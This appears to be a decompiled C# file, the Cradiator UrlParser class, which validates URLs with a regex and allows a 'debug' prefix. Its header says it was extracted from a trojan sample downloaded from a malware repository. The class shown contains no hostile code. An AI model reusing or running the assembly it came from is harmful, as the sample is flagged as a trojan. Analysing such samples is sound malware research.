// Decompiled with JetBrains decompiler
// Type: Cradiator.Model.UrlParser
// Assembly: EvidenceTypeDescript, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B50F5F07-D63E-4094-B80D-E78774C87D41
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Crypt.gen-c59c8e3be7ec42553ff6af2588e3bcd0569e9467dbb9307218fb8724e02739f2.exe

using Cradiator.Extensions;
using log4net;
using System.Text.RegularExpressions;

namespace Cradiator.Model
{
  public class UrlParser
  {
    private static readonly ILog _log = LogManager.GetLogger(typeof (UrlParser).Name);
    private readonly string _url;

    public UrlParser(string url) => this._url = url;

    public string Url => this._url;

    public bool IsValid
    {
      get
      {
        bool isValid = this.IsDebug || Regex.IsMatch(this._url, "^((https?)://+[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)");
        if (!isValid)
          UrlParser._log.WarnFormat("Skipping invalid URL: '{0}'", (object) this._url);
        return isValid;
      }
    }

    public bool IsNotValid => !this.IsValid;

    public bool IsDebug => this._url.HasValue() && this._url.ToLower().StartsWith("debug");
  }
}
